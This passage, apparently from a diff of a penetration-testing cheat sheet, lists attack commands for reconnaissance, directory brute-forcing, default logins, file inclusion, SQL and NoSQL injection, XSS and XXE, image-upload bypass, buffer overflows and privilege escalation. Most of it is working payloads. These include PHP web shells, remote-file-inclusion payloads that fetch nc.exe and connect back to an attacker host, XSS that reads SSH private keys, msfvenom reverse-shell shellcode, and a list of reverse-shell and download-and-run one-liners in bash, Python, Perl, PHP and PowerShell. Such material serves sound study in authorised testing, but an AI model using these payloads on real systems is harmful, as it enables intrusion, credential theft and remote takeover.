+</code></pre></div><ul><li>Try zone transfer for subdomains:</li></ul><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>dig axfr @$IP hostname.box
+dnsenum $IP
+dnsrecon -d domain.com -t axfr
+
+</code></pre></div><h3 id=port-80---web-server>Port 80 - web server
+<a class=heading-link href=#port-80---web-server><i class="fa fa-link" aria-hidden=true></i></a></h3><ul><li>Navigate && robots.txt &&sitemap.xml :smirk:</li><li>Headers</li><li>Source Code</li></ul><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Server Version (Vulnerable?)</span>
+whatweb -a <span style=color:#ff0;font-weight:700>1</span> &lt;URL&gt; <span style=color:#007f7f>#Stealthy</span>
+whatweb -a <span style=color:#ff0;font-weight:700>3</span> &lt;URL&gt; <span style=color:#007f7f>#Aggresive</span>
+webtech -u &lt;URL&gt;
+
+<span style=color:#007f7f># Nikto</span>
+nikto -h http://$ip
+
+<span style=color:#007f7f># CMS Explorer</span>
+cms-explorer -url http://$IP -type [Drupal, WordPress, Joomla, Mambo]
+
+<span style=color:#007f7f># WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)</span>
+wpscan --url http://$IP
+wpscan --url http://$IP --enumerate vp
+wpscan --url http://$IP --enumerate vt
+wpscan --url http://$IP --enumerate u
+wpscan -e --url https://url.com
+
+<span style=color:#007f7f># Enum User:</span>
+
+<span style=color:#fff;font-weight:700>for</span> i in {1..50}; <span style=color:#fff;font-weight:700>do</span> curl -s -L -i https://ip.com/wordpress<span style=color:#0ff;font-weight:700>\?</span>author=$i | grep -E -o <span style=color:#0ff;font-weight:700>&#34;Location:.*&#34;</span> | awk -F/ <span style=color:#0ff;font-weight:700>&#39;{print $NF}&#39;</span>;<span style=color:#fff;font-weight:700>done</span>
+
+<span style=color:#007f7f># Joomscan</span>
+joomscan -u  http://$IP
+joomscan -u  http://$IP --enumerate-components
+
+<span style=color:#007f7f># Get header</span>
+curl -i $IP
+
+<span style=color:#007f7f># Get options</span>
+curl -i -X OPTIONS $IP
+
+<span style=color:#007f7f># Get everything</span>
+curl -i -L $IP
+curl -i -H <span style=color:#0ff;font-weight:700>&#34;User-Agent:Mozilla/4.0&#34;</span> http://$IP:8080
+
+<span style=color:#007f7f># Check for title and all links</span>
+curl $IP -s -L | grep <span style=color:#0ff;font-weight:700>&#34;title\|href&#34;</span> | sed -e <span style=color:#0ff;font-weight:700>&#39;s/^[[:space:]]*//&#39;</span>
+
+<span style=color:#007f7f># Look at page with just text</span>
+curl $IP -s -L | html2text -width <span style=color:#0ff;font-weight:700>&#39;99&#39;</span> | uniq
+
+<span style=color:#007f7f># Check if it is possible to upload</span>
+curl -v -X OPTIONS http://$IP/
+curl -v -X PUT -d <span style=color:#0ff;font-weight:700>&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> http://$IP/test/shell.php
+
+<span style=color:#007f7f># Simple curl POST request with login data</span>
+curl -X POST http://$IP/centreon/api/index.php?action=authenticate -d <span style=color:#0ff;font-weight:700>&#39;username=centreon&amp;password=wall&#39;</span>
+
+curl -s  http://$IP/fileRead.php -d <span style=color:#0ff;font-weight:700>&#39;file=fileRead.php&#39;</span> | jq -r .<span style=color:#0ff;font-weight:700>&#34;file&#34;</span>
+
+
+<span style=color:#007f7f># Google Dork</span>
+
+site:domain.com intext:user
+
+https://github.com/sushiwushi/bug-bounty-dorks
+</code></pre></div><h4 id=url-brutforce>Url Brutforce
+<a class=heading-link href=#url-brutforce><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Ffuf</span>
+ffuf -c -e <span style=color:#0ff;font-weight:700>&#39;.htm&#39;</span>,<span style=color:#0ff;font-weight:700>&#39;.php&#39;</span>,<span style=color:#0ff;font-weight:700>&#39;.html&#39;</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://$IP/FUZZ
+
+<span style=color:#007f7f># Dirb not recursive</span>
+dirb http://$IP -r -o dirb-$IP.txt
+
+<span style=color:#007f7f># Wfuzz</span>
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc <span style=color:#ff0;font-weight:700>404</span> http://$IP/FUZZ
+
+gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt -x php -e <span style=color:#007f7f># add -k for https</span>
+
+<span style=color:#007f7f># dirseache</span>
+git clone https://github.com/maurosoria/dirsearch.git
+<span style=color:#fff;font-weight:700>cd</span> dirsearch
+./dirsearch.py -u http://$IP -e php,txt,html -x <span style=color:#ff0;font-weight:700>404</span>
+./dirsearch.py -r -f -u https://google.com --extensions=htm,html,asp,aspx,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t <span style=color:#ff0;font-weight:700>40</span>
+
+<span style=color:#007f7f># Crawl:</span>
+dirhunt https://url.com/
+hakrwaler https://url.com/
+
+<span style=color:#007f7f># Sub domain brut</span>
+https://github.com/aboul3la/Sublist3r
+
+</code></pre></div><ul><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Subdomains%20Enumeration.md>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Subdomains%20Enumeration.md</a></li></ul><h4 id=default_weak-login>Default_Weak login
+<a class=heading-link href=#default_weak-login><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>
+site:domain.com password
+
+admin admin
+admin password
+admin &lt;blank&gt;
+admin &lt;servicename&gt;
+root root
+root admin
+root password
+root &lt;servicename&gt;
+&lt;username <span style=color:#fff;font-weight:700>if</span> you have&gt; password
+&lt;username <span style=color:#fff;font-weight:700>if</span> you have&gt; admin
+&lt;username <span style=color:#fff;font-weight:700>if</span> you have&gt; username
+username &lt;servicename&gt;
+
+</code></pre></div><blockquote><p>list of user names</p></blockquote><p><a href=https://github.com/danielmiessler/SecLists/tree/master/Usernames>https://github.com/danielmiessler/SecLists/tree/master/Usernames</a></p><h4 id=lfi-rfi>LFI-RFI
+<a class=heading-link href=#lfi-rfi><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f>#Fimap</span>
+fimap -u <span style=color:#0ff;font-weight:700>&#34;http://</span>$IP<span style=color:#0ff;font-weight:700>/example.php?test=&#34;</span>
+
+curl -s http://$IP/gallery.php?page=/etc/passwd
+
+<span style=color:#007f7f>#Use in &#34;page=&#34;</span>
+
+php://filter/convert.base64-encode/resource=/etc/passwd
+
+http://$IP/maliciousfile.txt%00
+
+php://filter/convert.base64-encode/resource=../config.php
+
+php://filter/convert.base64-encode/resource=../../../../../boot.ini
+
+<span style=color:#007f7f># LFI Windows  :warning:</span>
+LANG=../../windows/system32/drivers/etc/hosts%00
+LANG=../../xampp/apache/logs/access.log%00&amp;cmd=ipconfig
+
+<span style=color:#007f7f># Contaminating log files</span>
+root@kali:~# nc -v $IP <span style=color:#ff0;font-weight:700>80</span>
+$IP: inverse host lookup failed: Unknown host
+(UNKNOWN) [$IP] <span style=color:#ff0;font-weight:700>80</span> (http) open
+ &lt;?php <span style=color:#fff;font-weight:700>echo</span> shell_exec($_GET[<span style=color:#0ff;font-weight:700>&#39;cmd&#39;</span>]);?&gt;
+
+<span style=color:#007f7f># Contaminating log files</span>
+[root:~]<span style=color:#007f7f># nc -v $IP 80</span>
+$IP: inverse host lookup failed: Unknown host
+(UNKNOWN) [$IP] <span style=color:#ff0;font-weight:700>80</span> (http) open
+ &lt;?php <span style=color:#fff;font-weight:700>echo</span> shell_exec($_GET[<span style=color:#0ff;font-weight:700>&#39;cmd&#39;</span>]);?&gt;
+
+<span style=color:#007f7f># RFI:</span>
+http://$IP/addguestbook.php?LANG=http://$IP:31/evil.txt%00
+Content of evil.txt:
+&lt;?php <span style=color:#fff;font-weight:700>echo</span> shell_exec(<span style=color:#0ff;font-weight:700>&#34;nc.exe 10.11.0.105 4444 -e cmd.exe&#34;</span>) ?&gt;
+
+<span style=color:#007f7f># PHP Filter:</span>
+http://$IP/index.php?m=php://filter/convert.base64-encode/resource=config
+
+<span style=color:#007f7f># RFI over SMB (Windows)</span>
+cat php_cmd.php
+    &lt;?php <span style=color:#fff;font-weight:700>echo</span> shell_exec($_GET[<span style=color:#0ff;font-weight:700>&#39;cmd&#39;</span>]);?&gt;
+  Start SMB Server in attacker machine and put evil script
+  Access it via browser (<span style=color:#ff0;font-weight:700>2</span> request attack):
+lang=<span style=color:#0ff;font-weight:700>\\</span>ATTACKER_IP<span style=color:#0ff;font-weight:700>\i</span>ca<span style=color:#0ff;font-weight:700>\p</span>hp_cmd.php&amp;cmd=powershell -c Invoke-WebRequest -Uri <span style=color:#0ff;font-weight:700>&#34;http://10.10.14.42/nc.exe&#34;</span> -OutFile <span style=color:#0ff;font-weight:700>&#34;C:\\windows\\system32\\spool\\drivers\\color\\nc.exe&#34;</span>
+lang=<span style=color:#0ff;font-weight:700>\\</span>ATTACKER_IP<span style=color:#0ff;font-weight:700>\i</span>ca<span style=color:#0ff;font-weight:700>\p</span>hp_cmd.php&amp;cmd=powershell -c <span style=color:#0ff;font-weight:700>&#34;C:\\windows\\system32\\spool\\drivers\\color\\nc.exe&#34;</span> -e cmd.exe ATTACKER_IP <span style=color:#ff0;font-weight:700>1234</span>
+
+</code></pre></div><blockquote><p>read this :
+<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</a></p></blockquote><h4 id=sql-injection>Sql-injection
+<a class=heading-link href=#sql-injection><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f>#POST</span>
+sqlmap.py -r search-test.txt
+
+<span style=color:#007f7f>#GET</span>
+sqlmap -u <span style=color:#0ff;font-weight:700>&#34;http://</span>$IP<span style=color:#0ff;font-weight:700>/index.php?id=1&#34;</span> --dbms=mysql
+
+<span style=color:#007f7f>#FULL ;)</span>
+sqlmap -u <span style=color:#0ff;font-weight:700>&#39;http://$IP:1337/978345210/index.php&#39;</span> --forms --dbs --risk=<span style=color:#ff0;font-weight:700>3</span> --level=<span style=color:#ff0;font-weight:700>5</span> --threads=<span style=color:#ff0;font-weight:700>4</span> --batch
+
+<span style=color:#007f7f># NoSQL</span>
+<span style=color:#0ff;font-weight:700>&#39; || &#39;</span>a<span style=color:#0ff;font-weight:700>&#39;==&#39;</span>a
+
+<span style=color:#007f7f>#in URL</span>
+username[$ne]=0xtz&amp;password[$ne]=0xtz  <span style=color:#007f7f># :joy: i&#39;m never use this user name</span>
+
+<span style=color:#007f7f>#in JSON</span>
+{<span style=color:#0ff;font-weight:700>&#34;username&#34;</span>: {<span style=color:#0ff;font-weight:700>&#34;</span>$ne<span style=color:#0ff;font-weight:700>&#34;</span>: null}, <span style=color:#0ff;font-weight:700>&#34;password&#34;</span>: {<span style=color:#0ff;font-weight:700>&#34;</span>$ne<span style=color:#0ff;font-weight:700>&#34;</span>: null}}
+{<span style=color:#0ff;font-weight:700>&#34;username&#34;</span>: {<span style=color:#0ff;font-weight:700>&#34;</span>$gt<span style=color:#0ff;font-weight:700>&#34;</span>:<span style=color:#0ff;font-weight:700>&#34;&#34;</span>}, <span style=color:#0ff;font-weight:700>&#34;password&#34;</span>: {<span style=color:#0ff;font-weight:700>&#34;</span>$gt<span style=color:#0ff;font-weight:700>&#34;</span>:<span style=color:#0ff;font-weight:700>&#34;&#34;</span>}}
+
+</code></pre></div><p><a href=https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/>sql-injection-authentication-bypass-cheat-sheet</a>
+<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection>PayloadsAllTheThings</a></p><h4 id=xss>XSS
+<a class=heading-link href=#xss><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>&lt;script&gt;alert(<span style=color:#0ff;font-weight:700>&#34;XSS&#34;</span>)&lt;<span style=color:red>/script&gt;</span>
+&lt;script&gt;alert(<span style=color:#ff0;font-weight:700>1</span>)&lt;<span style=color:red>/script&gt;</span>
+
+<span style=color:#0ff;font-weight:700>&#34; &lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open(&#34;</span>GET<span style=color:#0ff;font-weight:700>&#34;,&#34;</span>file:<span style=color:#007f7f>///home/reader/.ssh/id_rsa&#34;); x.send(); &lt;/script&gt;
+</span><span style=color:#007f7f></span>
+<span style=color:#0ff;font-weight:700>&#34; &lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(&#34;</span>GET<span style=color:#0ff;font-weight:700>&#34;,&#34;</span>file:<span style=color:#007f7f>///etc/passwd&#34;); x.send(); &lt;/script&gt;
+</span><span style=color:#007f7f></span>
+<span style=color:red>#</span> XXE
+
+XML entry that reads server, Doctype, change to entity <span style=color:#0ff;font-weight:700>&#34;System &#34;</span>file:<span style=color:#007f7f>///etc/passwd&#34;&#34;
+</span><span style=color:#007f7f></span>
+<span style=color:red>#</span>Instead POST:
+
+&lt;?xml version=<span style=color:#0ff;font-weight:700>&#34;1.0&#34;</span> ?&gt;
+    &lt;!DOCTYPE thp [
+        &lt;!ELEMENT thp ANY&gt;
+        &lt;!ENTITY book <span style=color:#0ff;font-weight:700>&#34;Universe&#34;</span>&gt;
+    ]&gt;
+    &lt;thp&gt;hack  &amp;book;&lt;<span style=color:red>/thp&gt;</span>
+
+
+<span style=color:red>#</span>Malicious XML:
+
+&lt;?xml version=<span style=color:#0ff;font-weight:700>&#34;1.0&#34;</span> ?&gt;&lt;!DOCTYPE thp [ &lt;!ELEMENT thp ANY&gt;
+&lt;!ENTITY book SYSTEM <span style=color:#0ff;font-weight:700>&#34;file:///etc/passwd&#34;</span>&gt;]&gt;&lt;thp&gt;Hack
+%<span style=color:#ff0;font-weight:700>26</span>book%<span style=color:#ff0;font-weight:700>3</span>B&lt;<span style=color:red>/thp&gt;</span>
+
+</code></pre></div><h4 id=sql-login-bypass>Sql-login Bypass
+<a class=heading-link href=#sql-login-bypass><i class="fa fa-link" aria-hidden=true></i></a></h4><blockquote><p>Open Burp-suite
+Make and intercept a request
+Send to intruder
+Cluster attack.
+Paste in sqlibypass-list
+<a href=https://bobloblaw.gitbooks.io/security/content/sql-injections.html>https://bobloblaw.gitbooks.io/security/content/sql-injections.html</a>
+Attack
+Check for response length variation</p></blockquote><h4 id=bypass-img-upload>Bypass img Upload
+<a class=heading-link href=#bypass-img-upload><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>Change extension: .pHp3 or pHp3.jpg
+Modify mimetype: Content-type: image/jpeg
+Bypass getimagesize(): exiftool -Comment=<span style=color:#0ff;font-weight:700>&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#39;</span>cmd<span style=color:#0ff;font-weight:700>&#39;]); ?&gt;&#39;</span> file.jpg
+Add gif header: GIF89a;
+All at the same time.
+<span style=color:#007f7f># inject PHP into img</span>
+
+exiv2 -c<span style=color:#0ff;font-weight:700>&#39;A &#34;&lt;?php system($_REQUEST[&#39;</span>cmd<span style=color:#0ff;font-weight:700>&#39;]);?&gt;&#34;!&#39;</span> shell.jpeg
+
+exiftool -Comment=<span style=color:#0ff;font-weight:700>&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#39;</span>cmd<span style=color:#0ff;font-weight:700>&#39;]); ?&gt;&#39;</span> shell.jpg
+
+</code></pre></div><h3 id=online-crackers>Online crackers
+<a class=heading-link href=#online-crackers><i class="fa fa-link" aria-hidden=true></i></a></h3><p><a href=https://hashkiller.co.uk/Cracker>https://hashkiller.co.uk/Cracker</a>
+<a href=https://www.cmd5.org/>https://www.cmd5.org/</a>
+<a href=https://www.onlinehashcrack.com/>https://www.onlinehashcrack.com/</a>
+<a href=https://gpuhash.me/>https://gpuhash.me/</a>
+<a href=https://crackstation.net/>https://crackstation.net/</a>
+<a href=https://crack.sh/>https://crack.sh/</a>
+<a href=https://hash.help/>https://hash.help/</a>
+<a href=https://passwordrecovery.io/>https://passwordrecovery.io/</a>
+<a href=http://cracker.offensive-security.com/>http://cracker.offensive-security.com/</a></p><h1 id=vulnerability-analysis>Vulnerability analysis
+<a class=heading-link href=#vulnerability-analysis><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=buffer-overflow>Buffer Overflow
+<a class=heading-link href=#buffer-overflow><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># BASIC GUIDE</span>
+1. Send <span style=color:#0ff;font-weight:700>&#34;A&#34;</span>*1024
+2. Replace <span style=color:#0ff;font-weight:700>&#34;A&#34;</span> with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH
+3. When crash <span style=color:#0ff;font-weight:700>&#34;!mona findmsp&#34;</span> (E$IP offset) or <span style=color:#0ff;font-weight:700>&#34;&#34;</span>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q TEXT<span style=color:#0ff;font-weight:700>&#34; or &#34;</span>!mona pattern_offset eip<span style=color:#0ff;font-weight:700>&#34;
+</span><span style=color:#0ff;font-weight:700>4. Confirm the location with &#34;</span>B<span style=color:#0ff;font-weight:700>&#34; and &#34;</span>C<span style=color:#0ff;font-weight:700>&#34;
+</span><span style=color:#0ff;font-weight:700>5. Check for badchars instead CCCC (ESP):
+</span><span style=color:#0ff;font-weight:700>badchars = (&#34;</span><span style=color:#0ff;font-weight:700>\x</span>01<span style=color:#0ff;font-weight:700>\x</span>02<span style=color:#0ff;font-weight:700>\x</span>03<span style=color:#0ff;font-weight:700>\x</span>04<span style=color:#0ff;font-weight:700>\x</span>05<span style=color:#0ff;font-weight:700>\x</span>06<span style=color:#0ff;font-weight:700>\x</span>07<span style=color:#0ff;font-weight:700>\x</span>08<span style=color:#0ff;font-weight:700>\x</span>09<span style=color:#0ff;font-weight:700>\x</span>0a<span style=color:#0ff;font-weight:700>\x</span>0b<span style=color:#0ff;font-weight:700>\x</span>0c<span style=color:#0ff;font-weight:700>\x</span>0d<span style=color:#0ff;font-weight:700>\x</span>0e<span style=color:#0ff;font-weight:700>\x</span>0f<span style=color:#0ff;font-weight:700>\x</span>10<span style=color:#0ff;font-weight:700>&#34; &#34;</span><span style=color:#0ff;font-weight:700>\x</span>11<span style=color:#0ff;font-weight:700>\x</span>12<span style=color:#0ff;font-weight:700>\x</span>13<span style=color:#0ff;font-weight:700>\x</span>14<span style=color:#0ff;font-weight:700>\x</span>15<span style=color:#0ff;font-weight:700>\x</span>16<span style=color:#0ff;font-weight:700>\x</span>17<span style=color:#0ff;font-weight:700>\x</span>18<span style=color:#0ff;font-weight:700>\x</span>19<span style=color:#0ff;font-weight:700>\x</span>1a<span style=color:#0ff;font-weight:700>\x</span>1b<span style=color:#0ff;font-weight:700>\x</span>1c<span style=color:#0ff;font-weight:700>\x</span>1d<span style=color:#0ff;font-weight:700>\x</span>1e<span style=color:#0ff;font-weight:700>\x</span>1f<span style=color:#0ff;font-weight:700>\x</span>20<span style=color:#0ff;font-weight:700>&#34;
+</span><span style=color:#0ff;font-weight:700>... )
+</span><span style=color:#0ff;font-weight:700>with script _badchars.py and
+</span><span style=color:#0ff;font-weight:700>&#34;</span>!mona compare -a esp -f C:<span style=color:#0ff;font-weight:700>\U</span>sers<span style=color:#0ff;font-weight:700>\I</span>EUser<span style=color:#0ff;font-weight:700>\D</span>esktop<span style=color:#0ff;font-weight:700>\b</span>adchar_test.bin<span style=color:#0ff;font-weight:700>&#34;
+</span><span style=color:#0ff;font-weight:700> 5.1 AWESOME WAY TO CHECK BADCHARS ( https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/ ):
+</span><span style=color:#0ff;font-weight:700>    a. !mona config -set workingfolder c:\logs\%p
+</span><span style=color:#0ff;font-weight:700>    b. !mona bytearray -b &#34;</span><span style=color:#0ff;font-weight:700>\x</span>00<span style=color:#0ff;font-weight:700>\x</span>0d<span style=color:#0ff;font-weight:700>&#34;
+</span><span style=color:#0ff;font-weight:700>    c. Copy from c:\logs\%p\bytearray.txt to python exploit and run again
+</span><span style=color:#0ff;font-weight:700>    d. !mona compare -f C:\logs\%p\bytearray.bin -a 02F238D0 (ESP address)
+</span><span style=color:#0ff;font-weight:700>    e. In &#34;</span> data<span style=color:#0ff;font-weight:700>&#34;, before unicode chars it shows badchars.
+</span><span style=color:#0ff;font-weight:700> 6. Find JMP ESP with &#34;</span>!mona modules<span style=color:#0ff;font-weight:700>&#34; or &#34;</span>!mona jmp -r esp<span style=color:#0ff;font-weight:700>&#34; or &#34;</span>!mona jmp -r esp -cpb <span style=color:#0ff;font-weight:700>&#39;\x00\x0a\x0d&#39;</span><span style=color:#0ff;font-weight:700>&#34; find one with security modules &#34;</span>FALSE<span style=color:#0ff;font-weight:700>&#34;
+</span><span style=color:#0ff;font-weight:700>6.1 Then, &#34;</span>!mona find -s <span style=color:#0ff;font-weight:700>&#34;\xff\xe4&#34;</span> -m PROGRAM/DLL-FALSE<span style=color:#0ff;font-weight:700>&#34;
+</span><span style=color:#0ff;font-weight:700>6.2 Remember put the JMP ESP location in reverse order due to endianness: 5F4A358F will be \x8f\x35\x4a\x5f
+</span><span style=color:#0ff;font-weight:700>
+</span><span style=color:#0ff;font-weight:700>
+</span><span style=color:#0ff;font-weight:700>7. Generate shellcode and place it:
+</span><span style=color:#0ff;font-weight:700>msfvenom -p windows/shell_reverse_tcp LHOST=</span>$IP<span style=color:#0ff;font-weight:700> LPORT=4433 -f python –e x86/shikata_ga_nai -b &#34;</span><span style=color:#0ff;font-weight:700>\x</span>00<span style=color:#0ff;font-weight:700>&#34;
+</span><span style=color:#0ff;font-weight:700>
+</span><span style=color:#0ff;font-weight:700>msfvenom -p windows/shell_reverse_tcp lhost=</span>$IP<span style=color:#0ff;font-weight:700> lport=443 EXITFUNC=thread -a x86 --platform windows -b &#34;</span><span style=color:#0ff;font-weight:700>\x</span>00<span style=color:#0ff;font-weight:700>\x</span>0a<span style=color:#0ff;font-weight:700>\x</span>0d<span style=color:#0ff;font-weight:700>&#34; -e x86/shikata_ga_nai -f python -v shellcode
+</span><span style=color:#0ff;font-weight:700>
+</span><span style=color:#0ff;font-weight:700>8. Final buffer like:
+</span><span style=color:#0ff;font-weight:700>buffer=&#34;</span>A<span style=color:#0ff;font-weight:700>&#34;*2606 + &#34;</span><span style=color:#0ff;font-weight:700>\x</span>8f<span style=color:#0ff;font-weight:700>\x</span>35<span style=color:#0ff;font-weight:700>\x</span>4a<span style=color:#0ff;font-weight:700>\x</span>5f<span style=color:#0ff;font-weight:700>&#34; + &#34;</span><span style=color:#0ff;font-weight:700>\x</span>90<span style=color:#0ff;font-weight:700>&#34; * 8 + shellcode
+</span><span style=color:#0ff;font-weight:700>
+</span><span style=color:#0ff;font-weight:700>
+</span></code></pre></div><h2 id=find-xploits---searchsploit-and-google>Find xploits - Searchsploit and google
+<a class=heading-link href=#find-xploits---searchsploit-and-google><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f>#Google</span>
+site:exploit-db.com apache 2.X.X
+
+searchsploit Apache 2.X.X
+searchsploit Apache | grep -v <span style=color:#0ff;font-weight:700>&#39;/dos/&#39;</span> | grep -vi <span style=color:#0ff;font-weight:700>&#34;tomcat&#34;</span>
+
+</code></pre></div><h2 id=reverse-sells>Reverse Sells
+<a class=heading-link href=#reverse-sells><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Linux</span>
+bash -i &gt;&amp; /dev/tcp/$IP/4443 0&gt;&amp;<span style=color:#ff0;font-weight:700>1</span>
+
+/bin/sh -i &gt; /dev/tcp/x.x.x.x/6969 0&lt;&amp;<span style=color:#ff0;font-weight:700>1</span> 2&gt;&amp;<span style=color:#ff0;font-weight:700>1</span>
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $IP <span style=color:#ff0;font-weight:700>4443</span> &gt;/tmp/f
+
+nc -e /bin/sh $IP <span style=color:#ff0;font-weight:700>4443</span>
+
+<span style=color:#007f7f># Python</span>
+python -c <span style=color:#0ff;font-weight:700>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;$IP&#34;,4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+
+__import__(<span style=color:#0ff;font-weight:700>&#39;os&#39;</span>).system(<span style=color:#0ff;font-weight:700>&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.9 4433 &gt;/tmp/f&#39;</span>)-1<span style=color:#0ff;font-weight:700>\
+</span><span style=color:#0ff;font-weight:700></span>
+<span style=color:#007f7f># Perl</span>
+perl -e <span style=color:#0ff;font-weight:700>&#39;use Socket;$i=&#34;$IP&#34;;$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
+
+<span style=color:#007f7f># Windows</span>
+nc -e cmd.exe $IP <span style=color:#ff0;font-weight:700>4443</span>
+
+<span style=color:#007f7f># from cmd</span>
+C:<span style=color:#0ff;font-weight:700>\W</span>indows<span style=color:#0ff;font-weight:700>\S</span>ysNative<span style=color:#0ff;font-weight:700>\W</span>indowsPowershell<span style=color:#0ff;font-weight:700>\v</span>1.0<span style=color:#0ff;font-weight:700>\p</span>owershell.exe IEX(New-Object Net.WebClient).downloadString(<span style=color:#0ff;font-weight:700>&#39;http://x.x.x.x/Invoke-PowerShellTcp.ps1&#39;</span>)
+
+<span style=color:#007f7f># PowerShell</span>
+PS C:<span style=color:#0ff;font-weight:700>\&gt;</span>IEX(New-Object Net.WebClient).downloadString(<span style=color:#0ff;font-weight:700>&#39;http://x.x.x.x/Invoke-PowerShellTcp.ps1&#39;</span>)
+
+
+<span style=color:#007f7f># PHP</span>
+&lt;?php $sock = fsockopen(<span style=color:#0ff;font-weight:700>&#34;</span>$IP<span style=color:#0ff;font-weight:700>&#34;</span>,1234); $proc = proc_open(<span style=color:#0ff;font-weight:700>&#34;/bin/sh -i&#34;</span>, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes);?&gt;
+
+php -r <span style=color:#0ff;font-weight:700>&#39;$sock=fsockopen(&#34;x.x.x.x&#34;,6969);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+
+ruby -rsocket -e<span style=color:#0ff;font-weight:700>&#39;f=TCPSocket.open(&#34;x.x.x.x&#34;,6969).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
+
+<span style=color:#007f7f>#OR use rsg</span>
+
+https://github.com/mthbernardes/rsg
+rsg &lt;interface&gt; &lt;port&gt;
+
+</code></pre></div><h1 id=privilege-escalation>Privilege escalation
+<a class=heading-link href=#privilege-escalation><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=common>Common
+<a class=heading-link href=#common><i class="fa fa-link" aria-hidden=true></i></a></h2><h3 id=set-up-webserver>Set up Webserver
+<a class=heading-link href=#set-up-webserver><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python -m SimpleHTTPServer <span style=color:#ff0;font-weight:700>80</span>
+python3 -m http.server
+ruby -r webrick -e <span style=color:#0ff;font-weight:700>&#34;WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&#34;</span>
+php -S 0.0.0.0:80
+https://github.com/sc0tfree/updogupdog
+
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#fff;font-weight:700>import</span> SimpleHTTPServer
